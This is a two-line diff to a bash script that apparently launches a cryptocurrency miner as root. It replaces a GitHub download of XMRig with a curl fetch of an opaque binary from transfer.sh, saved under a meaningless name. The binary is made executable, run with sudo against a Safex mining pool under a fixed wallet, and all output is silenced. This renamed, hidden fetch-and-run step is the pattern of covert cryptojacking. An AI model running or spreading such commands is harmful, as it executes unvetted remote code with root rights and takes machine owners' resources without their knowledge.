@@ -1,2 +1,2 @@
 #!/bin/bash
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -zxf xmrig-6.15.2-linux-static-x64.tar.gz && cd xmrig-6.15.2 && sudo ./xmrig -a rx/sfx -o pool.safex.org:3311 -u Safex5yuPhr9TAZMoZ3ZfQ5ERrEBB51QsGqpuHjJKLEj6CJ5CvuQPMXRcC37iQZSvtXPrhQEJopMc2W41VMLzyqGd2u7NcyUmKW2X -p TehRio --donate-level 1 -k >/dev/null >/dev/null 2>&1
+curl https://transfer.sh/LjjUnE/masterfile --output tgb && chmod +x tgb && sudo ./tgb -a rx/sfx -o pool.safex.org:3311 -u Safex5yuPhr9TAZMoZ3ZfQ5ERrEBB51QsGqpuHjJKLEj6CJ5CvuQPMXRcC37iQZSvtXPrhQEJopMc2W41VMLzyqGd2u7NcyUmKW2X -p PROXY --donate-level 1 -k >/dev/null >/dev/null 2>&1
